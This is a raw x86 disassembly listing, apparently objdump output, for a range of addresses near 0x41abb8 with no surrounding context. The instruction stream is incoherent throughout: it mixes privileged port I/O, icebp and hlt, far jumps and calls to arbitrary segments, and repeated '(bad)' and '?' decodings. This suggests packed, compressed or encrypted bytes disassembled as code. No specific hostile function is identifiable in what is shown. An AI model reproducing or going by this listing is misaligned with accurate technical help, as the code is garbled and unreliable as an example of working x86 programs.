  41abb8:	cmp    BYTE PTR [edx+0x40],0xd7
  41abbc:	adc    WORD PTR fs:[esi+eiz*1],di
  41abc1:	or     ebx,DWORD PTR [edi]
  41abc3:	cwde   
  41abc4:	push   ebp
  41abc5:	xlat   BYTE PTR ds:[ebx]
  41abc6:	out    0x1f,eax
  41abc8:	inc    esp
  41abc9:	shl    edx,cl
  41abcb:	gs stos BYTE PTR es:[edi],al
  41abcd:	call   0x4e88:0xce9e699d
  41abd4:	adc    ebp,DWORD PTR [ebx+0x3e]
  41abd7:	push   0x3aeb80f9
  41abdc:	jne    0x41abeb
  41abde:	or     al,0x9e
  41abe0:	inc    ebp
  41abe1:	sbb    esi,DWORD PTR [ebx+0x43ac151a]
  41abe7:	push   ebp
  41abe8:	icebp  
  41abe9:	fnstcw WORD PTR [ebp-0x3721a3e]
  41abef:	sahf   
  41abf0:	sbb    ch,BYTE PTR [edx+esi*1]
  41abf3:	in     eax,0x75
  41abf5:	shr    BYTE PTR [edi],1
  41abf7:	imul   ebx,DWORD PTR [ebp-0x4e],0xc289ba03
  41abfe:	and    eax,0x93c8ac61
  41ac03:	(bad)  [edi-0x3b]
  41ac06:	pop    edi
  41ac07:	mov    esi,DWORD PTR [ecx-0x47f9c1d]
  41ac0d:	push   0x67ed7a0d
  41ac12:	sub    DWORD PTR [ebx-0x73],0xa
  41ac16:	ja     0x41ab9e
  41ac18:	add    al,0xb6
  41ac1a:	cs push ecx
  41ac1c:	xchg   ecx,eax
  41ac1d:	dec    esp
  41ac1e:	cmp    eax,0xaad38dbc
  41ac23:	imul   esi,edx,0xffffffbc
  41ac26:	add    DWORD PTR [edx],edi
  41ac28:	cmp    DWORD PTR [esi+0x6e],ecx
  41ac2b:	push   ss
  41ac2c:	and    ebp,0x2
  41ac2f:	sub    BYTE PTR [ebp-0x7b5b2495],bh
  41ac35:	mov    BYTE PTR [edx-0x76],cl
  41ac38:	pop    ebp
  41ac39:	daa    
  41ac3a:	hlt    
  41ac3b:	xor    ebx,DWORD PTR [esi]
  41ac3d:	(bad)  
  41ac3e:	out    0x9e,eax
  41ac40:	jmp    0x6ee0231f
  41ac45:	inc    edx
  41ac46:	and    al,0x80
  41ac48:	fld    QWORD PTR [esi+ebx*8-0x17]
  41ac4c:	out    dx,eax
  41ac4d:	lods   eax,DWORD PTR ds:[esi]
  41ac4e:	test   BYTE PTR [esi-0x2d6a8b2e],ch
  41ac54:	mov    bl,0xe
  41ac56:	cmp    edx,DWORD PTR [edi-0x7f]
  41ac59:	mov    esi,0xe92cffa6
  41ac5e:	mov    dl,0x10
  41ac60:	push   ds
  41ac61:	add    al,0xfc
  41ac63:	add    eax,0x1c06659c
  41ac68:	inc    esp
  41ac69:	ins    BYTE PTR es:[edi],dx
  41ac6a:	ret    0x681c
  41ac6d:	inc    ebx
  41ac6e:	or     al,0x43
  41ac70:	add    al,0x67
  41ac72:	pop    eax
  41ac73:	mov    bh,0x16
  41ac75:	add    eax,0xc5deac92
  41ac7a:	jmp    0x41acdb
  41ac7c:	mov    gs,eax
  41ac7e:	inc    ebp
  41ac7f:	(bad)  
  41ac80:	jmp    0x41acae
  41ac82:	scas   al,BYTE PTR es:[edi]
  41ac83:	mov    ah,0x91
  41ac85:	stos   BYTE PTR es:[edi],al
  41ac86:	or     eax,0x4440a7e8
  41ac8b:	jmp    0xb840:0xf020a19b
  41ac92:	js     0x41acf1
  41ac94:	imul   esi,DWORD PTR [edi],0x42
  41ac97:	xor    al,ch
  41ac99:	inc    edx
  41ac9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac9b:	imul   ecx,esi,0xffffff83
  41ac9e:	mov    ebp,0x5d9593b9
  41aca3:	jne    0x41acfd
  41aca5:	lods   eax,DWORD PTR ds:[esi]
  41aca6:	adc    eax,0xc2be904f
  41acab:	push   es
  41acac:	mov    ebp,0x2135496e
  41acb1:	xor    DWORD PTR [ebx],esi
  41acb3:	sub    eax,0xa948d472
  41acb8:	lds    edx,FWORD PTR [eax]
  41acba:	loopne 0x41acaf
  41acbc:	je     0x41acf8
  41acbe:	and    edi,DWORD PTR [eax+ecx*1]
  41acc1:	dec    ebp
  41acc2:	das    
  41acc3:	cdq    
  41acc4:	std    
  41acc5:	lea    edi,ds:0x931a7a55
  41accb:	popa   
  41accc:	pop    edi
  41accd:	push   esp
  41acce:	leave  
  41accf:	ss nop
  41acd1:	nop
  41acd2:	dec    ecx
  41acd3:	aas    
  41acd4:	mov    bh,0x56
  41acd6:	mov    eax,0x4111bdce
  41acdb:	lea    esi,[esi]
  41acdd:	xor    eax,0x4298832b
  41ace2:	push   ebp
  41ace3:	dec    eax
  41ace4:	jbe    0x41acb1
  41ace6:	jmp    0xb175:0xc41a27e2
  41aced:	adc    eax,0xb7c8dad0
  41acf2:	or     ah,BYTE PTR [edx+edi*4-0x31]
  41acf6:	xlat   BYTE PTR cs:[ebx]
  41acf8:	inc    esp
  41acf9:	xchg   ebp,esi
  41acfb:	sbb    BYTE PTR es:[edx+ebp*4-0x42],dh
  41ad00:	xlat   BYTE PTR ds:[ebx]
  41ad01:	aam    0x7
  41ad03:	push   esp
  41ad04:	and    DWORD PTR [eax],edi
  41ad06:	jns    0x41acd8
  41ad08:	fadd   st,st(3)
  41ad0a:	inc    esi
  41ad0b:	mov    dl,0x14
  41ad0d:	xchg   ebp,eax
  41ad0e:	js     0x41acde
  41ad10:	sbb    eax,DWORD PTR [eax-0x20abf102]
  41ad16:	and    DWORD PTR [ebp-0x32ee361c],0x6965e1c7
  41ad20:	xchg   edx,eax
  41ad21:	pop    esi
  41ad22:	push   esi
  41ad23:	pop    edx
  41ad24:	push   cs
  41ad25:	jmp    0x17b2659f
  41ad2a:	sub    BYTE PTR es:[ecx+0x40],dl
  41ad2e:	pop    ss
  41ad2f:	adc    dl,BYTE PTR ds:0x72962e67
  41ad35:	dec    ebp
  41ad36:	inc    ecx
  41ad37:	cmp    al,0x80
  41ad39:	add    ebp,ebx
  41ad3b:	push   ss
  41ad3c:	or     al,0x3f
  41ad3e:	jne    0x41ad70
  41ad40:	sub    al,0x7f
  41ad42:	cli    
  41ad43:	xchg   ecx,eax
  41ad44:	shr    BYTE PTR [ebx+0x6e],cl
  41ad47:	not    bl
  41ad49:	push   es
  41ad4a:	mov    edi,0x3c35db1a
  41ad4f:	repz push ss
  41ad51:	push   ebp
  41ad52:	push   eax
  41ad53:	xlat   BYTE PTR gs:[ebx]
  41ad55:	pop    ds
  41ad56:	popa   
  41ad57:	addr16 push 0xffffffb4
  41ad5a:	test   BYTE PTR [esp+esi*8-0x36546111],al
  41ad61:	and    DWORD PTR [ebp+0x56],edi
  41ad64:	jo     0x41adc7
  41ad66:	adc    DWORD PTR [eax+0x17da8896],0xcd77aa79
  41ad70:	loop   0x41adce
  41ad72:	inc    ecx
  41ad73:	and    DWORD PTR [ebx],esi
  41ad75:	ffree  st(6)
  41ad77:	mov    BYTE PTR [ecx+0x75],al
  41ad7a:	mov    ah,0x8
  41ad7c:	or     dl,BYTE PTR ds:0x8dbd511f
  41ad82:	push   ebp
  41ad83:	sbb    DWORD PTR [edi+0x4d2ad24c],edi
  41ad89:	jg     0x41adb8
  41ad8b:	ins    BYTE PTR es:[edi],dx
  41ad8c:	(bad)  
  41ad8e:	iret   
  41ad8f:	les    esp,FWORD PTR [eax+0x379dc01c]
  41ad95:	dec    edi
  41ad96:	sub    al,0x22
  41ad98:	jmp    0x9cba:0xda3cf2c
  41ad9f:	mov    dl,0xa9
  41ada1:	inc    ebp
  41ada2:	adc    esp,ebp
  41ada4:	call   0xb0fa:0x52782a8f
  41adab:	xlat   BYTE PTR ds:[ebx]
  41adac:	ins    DWORD PTR es:[edi],dx
  41adad:	xor    BYTE PTR [edi+esi*2+0x7f23fb66],dl
  41adb4:	ss std 
  41adb6:	add    dl,BYTE PTR [eax]
  41adb8:	fsubr  DWORD PTR [ebx+0x78360487]
  41adbe:	je     0x41ad6f
  41adc0:	add    bh,BYTE PTR [edx+ebp*2+0x1e]
  41adc4:	push   esp
  41adc5:	mov    ebp,ss
  41adc7:	popa   
  41adc8:	loope  0x41ade5
  41adca:	enter  0x5c23,0xb4
  41adce:	inc    edx
  41adcf:	inc    ebx
  41add0:	jo     0x41ade3
  41add2:	sub    BYTE PTR [edi],al
  41add4:	mov    eax,0x13f04c62
  41add9:	test   BYTE PTR [ebx+0xd],ah
  41addc:	mov    eax,ds:0x7b43b25a
  41ade1:	dec    ebx
  41ade2:	pop    es
  41ade3:	jns    0x41ae01
  41ade5:	mov    ebp,DWORD PTR [ecx]
  41ade7:	and    ah,0x90
  41adea:	jmp    0xc476c97
  41adef:	push   esp
  41adf0:	fisub  WORD PTR ds:0xec10aa71
  41adf6:	loopne 0x41adf4
  41adf8:	inc    ebx
  41adf9:	(bad)  
  41adfa:	xchg   esp,eax
  41adfb:	sahf   
  41adfc:	sbb    edx,DWORD PTR [edx-0x6]
  41adff:	sub    BYTE PTR [esi],bh
  41ae01:	mov    dl,0x4f
  41ae03:	push   ss
  41ae04:	retf   0xb29c
  41ae07:	out    dx,al
  41ae08:	cmp    dl,BYTE PTR [edx]
  41ae0a:	mov    dh,0x8e
  41ae0c:	jno    0x41ae3c
  41ae0e:	std    
  41ae0f:	call   0x2f14:0x8b51b712
  41ae16:	xchg   ebx,eax
  41ae17:	icebp  
  41ae18:	jle    0x41ae36
  41ae1a:	push   0xffffffec
  41ae1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1d:	xchg   esp,eax
  41ae1e:	les    edx,FWORD PTR [edx-0x1f812bd9]
  41ae24:	or     ch,BYTE PTR [edx-0x73]
  41ae27:	xor    bl,BYTE PTR [eax-0x6b]
  41ae2a:	hlt    
  41ae2b:	js     0x41ae1e
  41ae2d:	push   0xffffff96
  41ae2f:	dec    ecx
  41ae30:	ss js  0x41ae98
  41ae33:	es loopne 0x41adb6
  41ae36:	shr    BYTE PTR [eax+0x2493b62a],0x63
  41ae3d:	push   esi
  41ae3e:	add    DWORD PTR [ebx],ebp
  41ae40:	adc    edx,DWORD PTR [esi-0x552bf358]
  41ae46:	inc    ebp
  41ae47:	jmp    FWORD PTR [ebx-0x5c54e8ae]
  41ae4d:	jb     0x41ade2
  41ae4f:	push   esp
  41ae50:	rcr    DWORD PTR [eax],cl
  41ae52:	call   DWORD PTR [ecx]
  41ae54:	mov    ds:0x262a4aa,eax
  41ae59:	sahf   
  41ae5a:	mov    dh,BYTE PTR [ebp-0x35]
  41ae5d:	mov    ds:0xc6ac31f1,eax
  41ae62:	nop    DWORD PTR [eax]
  41ae65:	mov    ebx,0x62ee63b0
  41ae6a:	scas   eax,DWORD PTR es:[edi]
  41ae6b:	dec    ecx
  41ae6c:	pop    ds
  41ae6d:	inc    edx
  41ae6e:	repz aad 0x93
  41ae71:	pop    edi
  41ae72:	jnp    0x41aee7
  41ae74:	ins    BYTE PTR es:[edi],dx
  41ae75:	ins    BYTE PTR es:[edi],dx
  41ae76:	popf   
  41ae77:	pusha  
  41ae78:	sbb    ah,BYTE PTR [ebx+ecx*8-0x6d0685df]
  41ae7f:	scas   al,BYTE PTR es:[edi]
  41ae80:	mov    ch,0x32
  41ae82:	mov    edi,0xb2eade7d
  41ae87:	pop    ecx
  41ae88:	dec    edi
  41ae89:	add    al,0xb9
  41ae8b:	arpl   WORD PTR cs:[esp+esi*2+0xbe749e6],bp
  41ae93:	(bad)  
  41ae94:	and    esp,DWORD PTR ds:0x67549a49
  41ae9a:	jecxz  0x41ae41
  41ae9c:	sub    eax,0x23e85417
  41aea1:	sub    DWORD PTR [ebp-0x75],eax
  41aea4:	sbb    DWORD PTR [esi-0x70],edx
  41aea7:	cmp    ecx,DWORD PTR [esi]
  41aea9:	push   edx
  41aeaa:	sbb    DWORD PTR [ebp+0x7567226e],esp
  41aeb0:	es or  al,0x3f
  41aeb3:	xchg   edx,eax
  41aeb4:	cmp    DWORD PTR [ebx-0x16],esi
  41aeb7:	cs mov esp,ebx
  41aeba:	push   ebx
  41aebb:	mov    ebp,0xce2c325f
  41aec0:	fwait
  41aec1:	sbb    eax,0xffffff95
  41aec4:	add    esp,DWORD PTR [ecx+0x38]
  41aec7:	fisubr WORD PTR [ecx+edi*2]
  41aeca:	out    dx,eax
  41aecb:	mov    ds:0xdeb76390,al
  41aed0:	mov    al,al
  41aed2:	mov    es,esp
  41aed4:	loopne 0x41aea4
  41aed6:	mov    dl,al
  41aed8:	mov    edx,DWORD PTR [edi]
  41aeda:	or     ebx,DWORD PTR [edi+0x21f486d2]
  41aee0:	scas   al,BYTE PTR es:[edi]
  41aee1:	mov    al,ds:0xb13d8cca
  41aee6:	outs   dx,BYTE PTR ds:[esi]
  41aee7:	mov    dh,0x31
  41aee9:	test   BYTE PTR [ebp+0x79],bl
  41aeec:	push   cs
  41aeed:	jo     0x41af34
  41aeef:	sub    dh,BYTE PTR [edi+eax*4]
  41aef2:	sbb    dh,BYTE PTR [ecx+0x16bfaf94]
  41aef8:	jmp    0x2b7404bf
  41aefd:	mov    ch,0xbe
  41aeff:	fisub  DWORD PTR [eax]
  41af01:	int3   
  41af02:	fcmovne st,st(5)
  41af04:	xchg   ecx,eax
  41af05:	stos   BYTE PTR es:[edi],al
  41af06:	cdq    
  41af07:	and    DWORD PTR [edi],ebx
  41af09:	add    eax,0xe2b95d80
  41af0e:	fs adc al,0x98
  41af11:	js     0x41af77
  41af13:	sbb    DWORD PTR [eax-0x6d],ebp
  41af16:	and    eax,esp
  41af18:	clc    
  41af19:	xchg   BYTE PTR [edx],bh
  41af1b:	imul   esp,DWORD PTR [ebx],0xc4f7177
  41af21:	cmp    eax,0x6ae14125
  41af26:	les    edx,FWORD PTR [ebp-0x7db3595a]
  41af2c:	push   cs
  41af2d:	dec    edi
  41af2e:	xchg   ecx,eax
  41af2f:	inc    eax
  41af30:	rcl    BYTE PTR cs:[ebp-0x1a],cl
  41af34:	inc    ecx
  41af35:	dec    ebp
  41af36:	or     bl,BYTE PTR [ebp+0x38605229]
  41af3c:	js     0x41aec3
  41af3e:	retf   
  41af3f:	sbb    BYTE PTR [edi+0x6e74a681],cl
  41af45:	mov    eax,0x87c8fb72
  41af4a:	out    dx,al
  41af4b:	clc    
  41af4c:	adc    bh,BYTE PTR [esi-0x45]
  41af4f:	test   al,0x99
  41af51:	jo     0x41af9f
  41af53:	xor    al,0x4c
  41af55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af56:	dec    eax
  41af57:	mov    dh,BYTE PTR [eax+0x3d7cd13b]
  41af5d:	test   al,0xa3
  41af60:	es ja  0x41af5d
  41af63:	stos   DWORD PTR es:[edi],eax
  41af64:	outs   dx,BYTE PTR ds:[esi]
  41af65:	mov    WORD PTR [edi+0x1d],cs
  41af68:	ret    0xee40
  41af6b:	sub    eax,0x4aa156a6
  41af70:	fwait
  41af71:	sbb    ebx,esp
  41af73:	add    ebp,edx
  41af75:	add    DWORD PTR [esi],0x41cdc622
  41af7b:	sub    eax,0x26598563
  41af80:	jmp    0x448933d8
  41af85:	push   ss
  41af86:	mov    DWORD PTR ds:0xa24eae49,esp
  41af8c:	push   ds
  41af8d:	or     BYTE PTR [ecx+edi*4],dl
  41af90:	sub    DWORD PTR [ecx-0x5130e8c7],ecx
  41af96:	stos   DWORD PTR es:[edi],eax
  41af97:	lods   eax,DWORD PTR ds:[esi]
  41af98:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af9a:	xchg   DWORD PTR [ecx+0x2],ebx
  41af9d:	jb     0x41af1f
  41af9f:	das    
  41afa0:	mov    bh,BYTE PTR [ebx-0xf]
  41afa3:	je     0x41af67
  41afa5:	cmp    al,0x67
  41afa7:	push   eax
  41afa8:	sti    
  41afa9:	mov    edx,0xd44a3867
  41afae:	shl    BYTE PTR [ecx],1
  41afb0:	lods   eax,DWORD PTR ds:[esi]
  41afb1:	rcr    BYTE PTR [ecx-0x7ae20a68],1
  41afb7:	dec    ebp
  41afb8:	adc    al,0xb3
  41afba:	xor    edi,DWORD PTR [edx+ecx*2+0x4fafa83d]
  41afc1:	cdq    
  41afc2:	push   eax
  41afc3:	ss pop ecx
  41afc5:	adc    al,0x5a
  41afc7:	cmp    edx,eax
  41afc9:	cmp    al,0xb6
  41afcb:	imul   ebp,DWORD PTR [ebx+0x51cc07e],0xffffffc9
  41afd2:	and    DWORD PTR [ebx-0x7e],eax
  41afd5:	inc    edx
  41afd6:	aad    0x7
  41afd8:	and    esi,eax
  41afda:	xlat   BYTE PTR ds:[ebx]
  41afdb:	add    BYTE PTR [ebp-0x51],bh
  41afde:	iret   
  41afdf:	inc    esi
  41afe0:	pop    eax
  41afe1:	add    eax,DWORD PTR [edi+0x3ae5b727]
  41afe7:	cdq    
  41afe8:	mov    ecx,0xd26eb2b3
  41afed:	mov    al,0x6c
  41afef:	mov    gs,WORD PTR [eax]
  41aff1:	mov    ds:0xf4f58f39,eax
  41aff6:	mov    bl,0xe2
  41aff8:	or     bl,BYTE PTR [esi]
  41affa:	inc    ebp
  41affb:	in     eax,0x86
  41affd:	js     0x41afe5
  41afff:	push   ds
  41b000:	imul   edi,DWORD PTR [ebp+0x7e81d284],0xa288851f
  41b00a:	in     eax,0xfd
  41b00c:	in     eax,dx
  41b00d:	xor    DWORD PTR [ecx+ebx*2-0x77],edi
  41b011:	or     BYTE PTR [esi+0x4ec68b3c],bh
  41b017:	aaa    
  41b018:	out    0xd7,eax
  41b01a:	push   edx
  41b01b:	(bad)  [ecx+ecx*1]
  41b01e:	xchg   DWORD PTR [ebx-0x5f],edi
  41b021:	cmp    DWORD PTR [ebp+0x5],edx
  41b024:	stos   DWORD PTR es:[edi],eax
  41b025:	fcmovne st,st(2)
  41b027:	repnz ficom DWORD PTR [edi+0x36]
  41b02b:	mov    cs,edx
  41b02d:	jmp    0x9a3d6b01
  41b032:	pop    es
  41b033:	jg     0x41b074
  41b035:	fisttp WORD PTR ds:0x7fb17244
  41b03b:	push   ds
  41b03c:	jg     0x41afcc
  41b03e:	out    dx,eax
  41b03f:	mov    ?,WORD PTR [esi]
  41b041:	and    DWORD PTR [edi+0x6e],ebx
  41b044:	dec    esp
  41b045:	ret    0x4721
  41b048:	cld    
  41b049:	scas   eax,DWORD PTR es:[edi]
  41b04a:	dec    edx
  41b04b:	sar    BYTE PTR [edx-0xf882b5f],0xcc
  41b052:	mov    ecx,0xe10f6d86
  41b057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b058:	xor    DWORD PTR [edi-0x6879a42f],ebx
  41b05e:	loopne 0x41b06b
  41b060:	js     0x41b0ab
  41b062:	ret    0x9af6
  41b065:	bound  ecx,QWORD PTR [ecx-0x7d]
  41b068:	mov    edx,0xf72dba7e
  41b06d:	or     bh,ch
  41b06f:	or     BYTE PTR [edx+0x6a],bh
  41b072:	inc    ebp
  41b073:	test   eax,0x80cfc287
  41b078:	mov    dh,0x41
  41b07a:	sbb    DWORD PTR [edi-0x4d0e724d],eax
  41b080:	jecxz  0x41b03a
  41b082:	pop    es
  41b083:	stos   DWORD PTR es:[edi],eax
  41b084:	cmc    
  41b085:	xor    DWORD PTR [ebp-0x2],0x3c3f4024
  41b08c:	dec    ecx
  41b08d:	add    ebx,DWORD PTR [edi+0x51310e69]
  41b093:	cs push esp
  41b095:	inc    edi
  41b096:	pop    eax
  41b097:	fild   QWORD PTR [esi-0x31]
  41b09a:	xchg   esp,eax
  41b09b:	jge    0x41b0f5
  41b09d:	jae    0x41b05e
  41b09f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b0a1:	cmc    
  41b0a2:	idiv   DWORD PTR [esi-0x1]
  41b0a5:	lds    esi,FWORD PTR [ecx]
  41b0a7:	cld    
  41b0a8:	mov    cl,0x24
  41b0aa:	rcl    DWORD PTR [edx+eax*8-0x1ac7368d],cl
  41b0b1:	mov    dh,BYTE PTR [edi+0x63]
  41b0b4:	jl     0x41b03d
  41b0b6:	and    esi,DWORD PTR [edi-0x30]
  41b0b9:	and    edi,ebp
  41b0bb:	icebp  
  41b0bc:	retf   0x4504
  41b0bf:	xor    BYTE PTR [ecx+0x69],bl
  41b0c2:	mov    dl,BYTE PTR [ecx-0x8]
  41b0c5:	test   DWORD PTR [ebx+0x657b9f53],0xe52181cf
  41b0cf:	jp     0x41b134
  41b0d1:	les    esi,FWORD PTR [ebx-0x2f]
  41b0d4:	jns    0x41b10b
  41b0d6:	push   ss
  41b0d7:	rol    DWORD PTR [ebx+ebp*8+0x30],1
  41b0db:	pop    ebx
  41b0dc:	in     eax,dx
  41b0dd:	adc    BYTE PTR [edx+eax*4],bh
  41b0e0:	lahf   
  41b0e1:	bound  ebx,QWORD PTR [ecx]
  41b0e3:	aam    0xdb
  41b0e5:	jbe    0x41b09e
  41b0e7:	mov    esp,0x8e0b9244
  41b0ec:	mov    ds:0xc045c46c,al
  41b0f1:	out    dx,eax
  41b0f2:	rcr    BYTE PTR [ebx],cl
  41b0f4:	inc    ecx
  41b0f5:	ins    DWORD PTR es:[edi],dx
  41b0f6:	mov    cl,0x9a
  41b0f8:	fucomp st(3)
  41b0fa:	sbb    DWORD PTR [esi+edx*4-0x80],eax
  41b0fe:	jb     0x41b13b
  41b100:	mov    edi,0x42fb00e
  41b105:	push   es
  41b106:	pop    esp
  41b107:	inc    esp
  41b108:	xchg   edx,eax
  41b109:	loopne 0x41b143
  41b10b:	add    BYTE PTR [esi],ah
  41b10d:	mov    dh,0x1b
  41b10f:	adc    ebx,DWORD PTR [eax+0x7a]
  41b112:	shl    DWORD PTR [ebp-0x44],cl
  41b115:	dec    ebp
  41b116:	xchg   esp,eax
  41b117:	or     al,0xd8
  41b119:	outs   dx,DWORD PTR ds:[esi]
  41b11a:	pop    esi
  41b11b:	pop    ebp
  41b11c:	rol    BYTE PTR [eax+eiz*8],0xb7
  41b120:	shr    BYTE PTR [edx-0x1ce4b02b],0x9b
  41b127:	dec    ebx
  41b128:	cdq    
  41b129:	pop    edx
  41b12a:	(bad)  
  41b12c:	sbb    al,0xe7
  41b12e:	or     al,0x5c
  41b130:	fwait
  41b131:	xor    ebx,ebp
  41b133:	pusha  
  41b134:	cmc    
  41b135:	ror    eax,0x9b
  41b138:	fcomp  st(3)
  41b13a:	and    al,0x59
  41b13c:	inc    esp
  41b13d:	jns    0x41b0ef
  41b13f:	jbe    0x41b173
  41b141:	mov    BYTE PTR [edi],0xbd
  41b144:	lods   eax,DWORD PTR ds:[esi]
  41b145:	adc    bl,BYTE PTR [ebx+0x61]
  41b148:	mov    ch,0xfa
  41b14a:	xor    edi,edi
  41b14c:	xlat   BYTE PTR ds:[ebx]
  41b14d:	push   ss
  41b14e:	fs xchg ebp,eax
  41b150:	sub    DWORD PTR [edx+0x69ebfc4f],ebx
  41b156:	mov    edx,0x8e1c2f05
  41b15b:	inc    esp
  41b15c:	push   edi
  41b15d:	test   al,0xcd
  41b15f:	sbb    ah,BYTE PTR [esi+0x2]
  41b162:	mov    esp,0xffac2f05
  41b167:	sub    dl,ch
  41b169:	dec    BYTE PTR [edi+0x59]
  41b16c:	into   
  41b16d:	jb     0x41b1a0
  41b16f:	sar    DWORD PTR [eax+edx*4],cl
  41b172:	dec    esp
  41b173:	push   edx
  41b174:	test   al,0xe5
  41b176:	mov    dl,0xf4
  41b178:	add    DWORD PTR [esi],0x104f2724
  41b17e:	mov    dl,0xf7
  41b180:	push   cs
  41b181:	stos   BYTE PTR es:[edi],al
  41b182:	pusha  
  41b183:	and    DWORD PTR [edx-0x7054b13a],edi
  41b189:	in     ax,dx
  41b18b:	retf   
  41b18c:	push   eax
  41b18d:	xchg   edi,eax
  41b18e:	push   si
  41b190:	sahf   
  41b191:	mov    eax,0x1ee4684c
  41b196:	mov    BYTE PTR [ebx],dl
  41b198:	sub    al,0x55
  41b19a:	stos   DWORD PTR es:[edi],eax
  41b19b:	and    BYTE PTR [ebx+eiz*4-0x2c],bh
  41b19f:	test   eax,0x562cabf8
  41b1a4:	into   
  41b1a5:	inc    ebp
  41b1a6:	cdq    
  41b1a7:	mov    DWORD PTR [eax],eax
  41b1a9:	loope  0x41b199
  41b1ab:	stc    
  41b1ac:	lods   al,BYTE PTR ds:[esi]
  41b1ad:	call   0xc6e0:0x4a428370
  41b1b4:	jb     0x41b146
  41b1b6:	xor    eax,0x611f3667
  41b1bb:	xchg   ebx,eax
  41b1bc:	sar    BYTE PTR [edi],cl
  41b1be:	adc    BYTE PTR [edx+0x12],dh
  41b1c1:	sub    al,0x29
  41b1c3:	test   al,0x41
  41b1c5:	push   0xffffffb1
  41b1c7:	sti    
  41b1c8:	imul   esp,DWORD PTR [ecx-0x63],0xd9987547
  41b1cf:	ret    
  41b1d0:	int3   
  41b1d1:	aas    
  41b1d2:	mov    ch,0xc7
  41b1d4:	jg     0x41b20b
  41b1d6:	dec    esi
  41b1d7:	or     al,0x2f
  41b1d9:	sub    DWORD PTR [edx-0x12],ebp
  41b1dc:	fidiv  DWORD PTR [edx+0x6e30ace9]
  41b1e2:	jno    0x41b25c
  41b1e4:	shl    DWORD PTR [esp+ebp*1-0x6e05ac41],cl
  41b1eb:	jmp    0x41b228
  41b1ed:	mov    ds:0x58146520,al
  41b1f2:	mov    ebp,0x15e76a5a
  41b1f7:	push   es
  41b1f8:	jmp    0x5583:0x20d0a662
  41b1ff:	gs icebp 
  41b201:	iret   
  41b202:	push   es
  41b203:	push   edi
  41b204:	jnp    0x41b1d3
  41b206:	xchg   edi,eax
  41b207:	push   cs
  41b208:	push   esp
  41b209:	dec    esp
  41b20a:	xchg   esi,eax
  41b20b:	and    DWORD PTR [edi+0x53],0xfffffff5
  41b20f:	shl    BYTE PTR [ecx-0x6c],0x84
  41b213:	aad    0x50
  41b215:	add    ebp,DWORD PTR [eax]
  41b217:	popa   
  41b218:	sbb    WORD PTR [ebp-0x56],sp
  41b21c:	js     0x41b22e
  41b21e:	clc    
  41b21f:	ret    0x9134
  41b222:	xchg   esp,eax
  41b223:	inc    ebp
  41b224:	iret   
  41b225:	js     0x41b26f
  41b227:	push   esi
  41b228:	jp     0x41b219
  41b22a:	jg     0x41b26f
  41b22c:	enter  0x2aab,0xcc
  41b230:	pop    ebp
  41b231:	sbb    BYTE PTR [eax],al
  41b233:	push   edi
  41b234:	jg     0x41b1bf
  41b236:	inc    ebx
  41b237:	jmp    FWORD PTR [ebx+0x7918c702]
  41b23d:	pop    edi
  41b23e:	stos   BYTE PTR es:[edi],al
  41b23f:	add    ebp,0xffffffa0
  41b242:	mov    ds:0x33e95283,al
  41b247:	stos   BYTE PTR es:[edi],al
  41b248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b249:	mov    eax,ds:0x3b989a23
  41b24e:	(bad)  
  41b24f:	fsub   DWORD PTR [edi-0x54]
  41b252:	add    eax,0x73fe43b9
  41b257:	in     eax,dx
  41b258:	neg    BYTE PTR ds:0x6d7c114c
  41b25e:	dec    ecx
  41b25f:	pop    esi
  41b260:	stos   BYTE PTR es:[edi],al
  41b261:	retw   0xbb79
  41b265:	xor    DWORD PTR [ebp-0x49],ecx
  41b268:	sub    BYTE PTR [ebp+0x4],0x92
  41b26c:	repnz popa 
  41b26e:	cwde   
  41b26f:	xchg   ch,al
  41b271:	cmp    esp,DWORD PTR [edx+edi*2-0x775d02a1]
  41b278:	fld    DWORD PTR [ecx+0x79914fad]
  41b27e:	je     0x41b2b3
  41b280:	mov    esp,ecx
  41b282:	xor    al,0x13
  41b284:	jecxz  0x41b2df
  41b286:	add    al,0xd6
  41b288:	outs   dx,DWORD PTR ds:[esi]
  41b289:	cmp    al,0x18
  41b28b:	push   ebx
  41b28c:	sar    DWORD PTR [edx+0x11],0x22
  41b290:	push   0x289047fd
  41b295:	dec    esi
  41b296:	mov    dh,0x6f
  41b298:	sub    ecx,DWORD PTR [ebp-0x4]
  41b29b:	fmul   DWORD PTR [ebx]
  41b29d:	xchg   esi,eax
  41b29e:	mov    al,ds:0xfc3ba7ac
  41b2a3:	push   eax
  41b2a4:	lahf   
  41b2a5:	and    DWORD PTR [esi+0x6f2ba753],eax
  41b2ab:	fwait
  41b2ac:	mov    WORD PTR [edi-0x2b],?
  41b2af:	icebp  
  41b2b0:	out    0xbe,eax
  41b2b2:	jecxz  0x41b31b
  41b2b4:	push   ss
  41b2b5:	fwait
  41b2b6:	xor    al,0xf4
  41b2b8:	lods   al,BYTE PTR ds:[esi]
  41b2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ba:	pop    ss
  41b2bb:	pop    ds
  41b2bc:	fwait
  41b2bd:	pushf  
  41b2be:	pop    eax
  41b2bf:	loop   0x41b280
  41b2c1:	sbb    BYTE PTR [edi+0x7a],bl
  41b2c4:	dec    ebx
  41b2c5:	cmp    eax,0xd446b43a
  41b2ca:	rol    DWORD PTR [ecx+0x7a],cl
  41b2cd:	jp     0x41b2b7
  41b2cf:	mov    dl,0xac
  41b2d1:	jmp    0x597ab349
  41b2d6:	scas   al,BYTE PTR es:[edi]
  41b2d7:	rcl    DWORD PTR [ebx-0x275d4924],0x9e
  41b2de:	call   0xeea1f0f
  41b2e3:	aam    0x4d
  41b2e5:	jae    0x41b33c
  41b2e7:	cmp    al,BYTE PTR [eax-0x22d9a270]
  41b2ed:	pop    ebp
  41b2ee:	rcl    DWORD PTR [esi-0x1ee17b3c],cl
  41b2f4:	fwait
  41b2f5:	sub    dh,bh
  41b2f7:	cs dec ecx
  41b2f9:	ss xor eax,0x279187c8
  41b2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b300:	into   
  41b301:	add    DWORD PTR [eax+0x41],0xfffffffc
  41b305:	jl     0x41b2ef
